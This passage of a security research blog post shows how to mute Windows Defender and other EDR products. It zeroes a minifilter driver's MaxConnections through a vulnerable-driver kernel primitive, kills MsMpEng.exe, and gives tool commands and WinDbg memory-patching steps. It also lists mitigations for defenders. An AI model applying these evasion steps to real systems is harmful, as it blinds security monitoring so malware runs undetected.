behaviour\n\nLet’s create a malware (code base available on ired.team) named `iwanttobeflag.exe` that will trigger Windows Defender:\n\nWe can then test the default reaction to our malware by copying the malicious payload from a share to the local disk. This raises an alert and is blocked by Windows Defender as expected: great!\n\ncopy z:\\iwanttobeflag.exe c:\\\n\nNow we have something that would in general cause an alert that we can use to test if our technique mutes the EDR. Using this we can test if our “filter-mute technique” could be useful.\n\nImplementing the Plan\n\nLets put this all together into a tool and test if our steps 1 and 2 can disrupt the alert caused in step 3.\n\nI love the EDRSandblast tool made by Thomas DIOT (Qazeer) and Maxime MEIGNAN (@th3m4ks), it’s really amazing. I opened a pull requests / issue but I don’t know if the project is maintained. This led me to starting my own project named EDRSnowblast in order to implement this “minifilter driver mute technique“. More details on this project is available at https://v1k1ngfr.github.io/edrsnowblast/.\n\nLets walk through the steps on a live machine and see what happens!\n\n1. enumerate drivers (filters) which are loaded in the kernel memory and identify Windows Defender : WdFilter at index 9 in the figure below\n\nEDRSnowblast.exe filter-enum --kernelmode\n\n2. retrieve details on WdFilter filter: for example MaxConnections & NumberOfConnections\n\nEDRSnowblast.exe filter-enum --kernelmode --filter-index 9\n\n3. mute WdFilter: set MaxConnections to zero\n\nEDRSnowblast.exe filter-mute --kernelmode --filter-index 9\n\n4. (optional) verify MaxConnections value using the –filter-enum option as seen previously\n\n5. identify the PID of Windows Defender usermode process and kill it\n\ntasklist | findstr MsMpEng.exe\nMsMpEng.exe                   2956 Services                   0    206,788 K\nc:\\pimpmypid_clt.exe /kill 2956\n\n6. copy our malicious payload created in step 3 and execute\n\ncopy z:\\iwanttobeflag.exe c:\\\nc:\\iwanttobeflag.exe\n\n7. bask in our success\n\nIf you prefer, you can watch the live demo video below.\n\nThis technique was successfully tested against Windows Defender and two other EDR vendors.\n\nHow to protect / detect ?\n\nWe must start by asking what are the “filter-mute” pre-requisites ?\n\nyou must use a Windows kernel R/W exploit primitive – if you want to use BYOVD (Bring Your Own Vulnerable Driver) you must have SeLoadDriverPrivilege, necessary for loading / unloading drivers (ex: local administrator, domain admin, domain print operator)\nyou must be able to kill (or restart) the EDR usermode application\n\nNow we could wonder if is it possible for Windows users to protect themselves? and yes some mitigations exist. Here are some recommendations:\n\napply Windows patches: it removes vulnerabilities from Windows kernel & drivers\nuse Microsoft VBS (enable HVCI): as you may have noticed, the attack vector used is BYOVD. This vector has been known for a long time and Microsoft did a great job to mitigate this with virtualization-based security (VBS) features available in Windows 10, Windows 11, Windows Server 2016, and later. More details on VBS in the Microsoft documentation: Virtualization-based Security (VBS)\nuse Microsoft recommended driver block rules available here\nuse Sysmon or Sigma rules: a huge list of known-vulnerable drivers is available on www.loldrivers.io and this project provides those kind of rules\n\nAnother question is: Can EDR vendors protect their drivers against this attack? Yes they can!\n\nThe fastest solution could be denylisting known-vulnerable drivers, avoiding them to be loaded. But this method has the same limitations as AV signatures; unknown vulnerable drivers won’t be blocked.\n\nBetter protections could be implemented by developers:\n\nalways verify that EDR_process.exe is able to connect to EDR_driver.sys communication port. An example of code that could achieve this:\nHANDLE hPort;\nHRESULT hr = ::FilterConnectCommunicationPort(L\"\\\\secureEDR\",0, nullptr, 0, nullptr, &hPort);\n\nif (FAILED(hr)) {\n   printf(\"Error connecting to EDR_driver.sys ! (HR=0x%08X)\\n\", hr);\n   if (hr == 0x800704D6) {\n      printf(\"ERROR_CONNECTION_COUNT_LIMIT : A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.\\n\");\n   }\n}\n// Other common errors you should check are\n// ERROR_BAD_PATHNAME (HR=0x800700A1)\n// E_FILE_NOT_FOUND (HR=0x80070002)\n// E_ACCESSDENIED (HR=0x80070005)\n// ERROR_INVALID_NAME (HR=0x8007007B)\nStatic KDP: an EDR driver should call the MmProtectDriverSection API for protecting a section of its image\nDynamic KDP: allows a driver to allocate and initialise read-only memory using services provided by a secure pool, which is managed by the secure kernel, using ExAllocatePool3 API.\n\nMore details on KDP in the post from Andrea Allievi: Introducing Kernel Data Protection\n\nResources and acknowledgments\n\nI would like to give you the most relevant resources used during this journey and also thanks those people helping this research to be easier.\n\nThank you for sharing your knowledge with the community!\n\n– Yarden Shafir (@yarden_shafir) for the blog – Investigating Filter Communication Ports\n\n– Christopher Vella (@kharosx0) for the talk – CrikeyCon 2019 talk – Reversing & bypassing EDRs\n\n– Zach Stein (@synzack21) for the blog – Blinding EDR On Windows\n\n– Alexandre Borges (@ale_sp_brazil) for the 109 pages (!) – Exploiting Reversing (ER) series\n\n– Pavel Yosifovich (@zodiacon) for the book – Windows Kernel Programming\n\n– Alex Ionescu (@aionescu) for the talks – REcon 2013 – I got 99 problems but a kernel pointer ain’t one\n\n– Connor McGarr (@33y0re) for the blog – Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG\n\nI hope you learnt something, thanks for reading!\n\nEXTRA MILE: “kernel walking, 10 steps to get access to MaxConnections”\n\nAlright you’re curious, the hacker spirit is great! Want to know how to get MaxConnections value? The method below shows how to get the MaxConnections value of the driver named bindflt.sys using Windbg. As a reminder / help, please find the hiking map below.\n\nTL;DR: the full solution is available in the map at the end of this section\n\nStep 0 – Identify the entry point\n\nThe starting point is the structure named FLTMGR!FltGlobals. You can get the address directly:\n\nkd> ? FLTMGR!FltGlobals\n\nBut if you need to retrieve this address using a memory leak, this path works like a charm:\n\n– get fltmgr.sys start address\n\nlmdvm fltmgr\n\n– get FltEnumerateFilters function offset, and in this function the offset of lea rcx, [FLTMGR!FltGlobals+0x58] instruction\n\nu FLTMGR!FltEnumerateFilters L15\n\n– compute FLTMGR!FltGlobals start address: 0xfffff8061ea8b600\n\n? fffff806`1ea8b658 - 0x58\n\nStep 1 – compute the FrameList field address stored in FLTMGR!FltGlobals: 0xfffff8061ea8b6c0\n\nkd> ? fffff806`1ea8b600 + 0x58 + 0x68\n\nStep 2 – use pointer indirection and get the first frame (Links filed) address in FLTMGR!_FLTP_FRAME: 0xffffca0c38c61058\n\nkd> ? poi(fffff806`1ea8b6c0)\n\nStep 3 – compute the First frame start address: 0xffffca0c38c61050\n\nkd> ? ffffca0c`38c61058 - 0x008\n\nStep 4 – compute the Filter List address: 0xffffca0c38c61100\n\nkd> ? ffffca0c`38c61050 + 0x48 + 0x68 + 0x000\n\nStep 5 – use pointer indirection and get the First filter (PrimaryLink field) address: 0xffffca0c386e8020\n\nkd> ? poi(ffffca0c`38c61100)\n\nStep 6 – compute the First filter address (Base of FLTMGR!_FLT_FILTER): 0xffffca0c386e8010\n\nkd> ? ffffca0c`386e8020 - 0x010\n\nOk nice we can verify and visualize where we are using Windbg filter kernel debugger (fltkd) command named frames:\n\nStep 7 – compute the Server Ports List address: 0xffffca0c386e8250\n\nkd> ? ffffca0c`386e8010 + 0x208 + 0x038 + 0x000\n\nStep 8 – use pointer indirection and get the First Server Ports Object address (FLTMGR!_FLT_SERVER_PORT_OBJECT FilterLink address): 0xffffca0c3eaf73f0\n\nkd> ? poi(ffffca0c`386e8250)\n\nStep 9 – compute the MaxConnections field address: 0xffffca0c3eaf7430\n\nkd> ? ffffca0c`3eaf73f0 +0x040\n\nStep 10 – use pointer indirection and get the MaxConnections value: 1000\n\nkd> .formats poi(ffffca0c`3eaf7430)\n\nor\n\nkd> dt _FLT_SERVER_PORT_OBJECT ffffca0c`3eaf73f0\n\nFinally! You got it!\n\nFinal steps – set the MaxConnections value to zero and kill EDR_Process.exe\n\nkd> eq 0xffffca0c3eaf7430 0\n\nand\n\nkd> !process 0 0 MsMpEng.exe\nPROCESS ffffa40a23a5f340\n\nkd> .kill ffffa40a23a5f340\n\nBecause it was a nightmare for me to visualise where I am in kernel memory, what are the fields of the data structures, the links between data structures, what offsets should I use, etc I made the map below (which also includes Windbg commands).\n\nMaybe (as I did) are you wondering what are those values used in computations: yes those are offsets.\n\nOffsets could change after Windows updates, personally I use a customised version of EDRSandblast’s ExtractOffsets.py script (available in EDRSnowblast). Output example is shown below.\n\nBecause we know the method and the offsets, we can automate this! PoC or GTFO, the code to do so can be found at EDRSnowblast.\n\nHappy hacking!",
    "title": "Filter-Mute Operation: Investigating EDR Internal Communication"
}
